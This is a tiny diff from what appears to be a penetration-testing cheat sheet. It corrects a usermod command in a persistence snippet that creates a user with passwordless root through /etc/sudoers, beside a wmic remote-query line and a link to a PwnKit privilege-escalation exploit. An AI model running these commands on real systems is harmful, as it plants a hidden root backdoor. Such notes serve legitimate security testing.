@@ -95,7 +95,7 @@ wmic /Node:@C:\tmp\targets.txt /USER:"domain\user" /namespace:\\root\SecurityCen
 pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 
 ```
 adduser user
-usermod -aG user sudo
+usermod -aG sudo user 
 echo 'user ALL=NOPASSWD: ALL' >> /etc/sudoers
 ```
 
